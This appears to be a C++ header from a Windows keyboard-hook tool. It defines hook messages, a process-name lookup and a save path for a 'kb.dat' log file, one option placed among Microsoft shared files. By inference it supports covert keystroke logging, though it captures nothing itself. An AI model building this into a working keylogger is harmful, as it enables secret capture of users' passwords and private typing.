#pragma once

#include <Windows.h>
#include <Psapi.h>
#include <time.h>

#define SHARED_MEMORY_NAME "hook_area"

#define WM_MESSAGE_HOOK		WM_USER+200 //
#define WM_KEYBOARD_HOOK	WM_USER+201 //
#define WM_DEBUG_HOOK		WM_USER+202 //



class Tool
{
public:
	static bool get_process_name(int pid, char* name){
		HANDLE handle = OpenProcess(
			PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
			FALSE,
			pid 
			);
		if(handle <= 0){
			return false;
		}
		bool ret = true;
		if (!GetModuleFileNameEx(handle, 0, name, MAX_PATH)){
			ret = false;
		}
		CloseHandle(handle);
		return ret;
	}

	static bool is_vista_or_later(){
		OSVERSIONINFO osvi;
		ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		GetVersionEx(&osvi);
		return osvi.dwMajorVersion > 5;
	}

	static bool get_save_path(char* path)
	{
		if (is_vista_or_later())
			strcpy(path, "C:\\Users\\Public\\Documents\\kb.dat");
		else
			strcpy(path, "C:\\Program Files\\Common Files\\Microsoft Shared\\kb.dat");
		return true;
	}

	
};
